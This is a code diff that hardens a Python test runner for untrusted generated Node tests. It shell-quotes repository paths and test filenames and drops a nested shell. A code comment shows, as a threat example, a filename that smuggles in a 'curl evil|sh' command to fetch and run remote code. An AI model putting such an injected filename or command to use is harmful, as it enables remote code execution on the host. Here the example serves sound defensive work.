@@ -1282,10 +1282,12 @@ def _run_node_tests(repo: str) -> tuple[bool, str]:
         pkg = {}
     if not (pkg.get("scripts") or {}).get("test"):
         return run_js_tests(repo)                        # no declared script → the framework-free node runner (sandboxed)
+    import shlex
     _npm_install_safe(repo)                              # deps WITHOUT lifecycle scripts (RCE-safe), outside jail
     # run the app's own test command INSIDE the sandbox; --ignore-scripts blocks pre/post-test lifecycle hooks
     # (the `test` script itself still runs via `npm run test`), so only the intended tests execute — jailed.
-    return _exec_tests(repo, f"cd {repo} && npm run test --silent --ignore-scripts", action="RunTests-node")
+    return _exec_tests(repo, f"cd {shlex.quote(str(repo))} && npm run test --silent --ignore-scripts",
+                       action="RunTests-node")
 
 
 def run_tests(repo: str, sandboxed: bool = True, target: str = "", python: str = "") -> tuple[bool, str]:
@@ -1359,9 +1361,13 @@ def run_js_tests(repo: str) -> tuple[bool, str]:
                       "error path, and edge case (a smoke-load is not QA)."
     # These test files are UNTRUSTED generated node code — run them INSIDE the srt sandbox (network denied,
     # writes limited to the repo) via _exec_tests, exactly like pytest, so they can't touch the factory host.
-    node_path = str(Path.home() / "projects" / "products" / "noupload" / "node_modules")
-    rels = " && ".join(f"node {f.relative_to(root)}" for f in files)
-    ok, out = _exec_tests(repo, f"cd {repo} && NODE_PATH={node_path} sh -c '{rels}'", action="JsTests")
+    # SHELL-QUOTE every untrusted filename (a builder could create a file named `x'; curl evil|sh; '.test.js`);
+    # the relative paths come from rglob of attacker-controlled names, so shlex.quote each token and the repo
+    # path, and drop the nested `sh -c` so nothing is re-parsed by an inner shell.
+    import shlex
+    node_path = shlex.quote(str(Path.home() / "projects" / "products" / "noupload" / "node_modules"))
+    cmds = " && ".join(f"NODE_PATH={node_path} node {shlex.quote(str(f.relative_to(root)))}" for f in files)
+    ok, out = _exec_tests(repo, f"cd {shlex.quote(str(repo))} && {cmds}", action="JsTests")
     audit.append(actor="factory:qa-security", action="JsTests", resource=root.name,
                  decision="executed", payload={"files": len(files), "ok": ok})
     return ok, out
